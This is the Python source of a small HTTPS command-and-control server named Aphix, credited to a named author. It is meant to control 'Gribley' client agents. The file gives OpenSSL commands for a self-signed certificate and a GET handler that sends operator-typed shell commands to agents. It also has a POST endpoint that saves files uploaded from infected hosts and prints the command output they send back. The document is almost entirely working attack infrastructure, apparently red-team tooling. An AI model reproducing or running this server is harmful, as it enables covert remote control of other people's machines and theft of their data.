# Authored by: Brent 'becrevex' Chambers
# Date: 03/22/2020
# Vendor Homepage: https://www.cygienesolutions.com/
# Filename: aphix_server.py
#
# Description:
# Aphix is an HTTPS C2 server which can establish remote control over Gribley client connected agents.

import http.server
import os, cgi
import sys
import ssl

# Steps to generate self-signed cert
# openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
# openssl x509 -text -noout -in certificate.pem
# openssl pkcs12 -inkey key.pem -in certificate.pem -export -out certificate.p12
# openssl pkcs12 -in certificate.p12 -noout -info


HOST_NAME = ''
try:
        PORT_NUMBER = int(sys.argv[1])
except:
        print("No port specified.  Defaulting to 443/TCP")
        PORT_NUMBER = 443

class MyHandler(http.server.BaseHTTPRequestHandler):

    def do_GET(self):
        dir(self)
        command = input("Shell> ")
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())

    def do_POST(self):
        if self.path == '/store':
            try:
                ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=self.rfile, headers = self.headers, environ= {'REQUEST_METHOD': 'POST'})
                else:
                    print('[-]Unexpected POST request')
                fs_up = fs['file']
                with open('./place_holder.txt', 'wb') as o:
                    print('[+] Writing file ..')
                    o.write(fs_up.file.read())
                    self.send_response(200)
                    self.end_headers()
            except Exception as e:
                print(e)
            return
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-length'])
        postVar = self.rfile.read(length)
        print(postVar.decode())

if __name__ == '__main__':
    server_class = http.server.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
    httpd.socket = ssl.wrap_socket(httpd.socket, keyfile="./key.pem", certfile="./certificate.pem", server_side=True)
    try:
        print('[+] Starting C2 Server')
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('[!] Server is terminated')
        httpd.server_close()
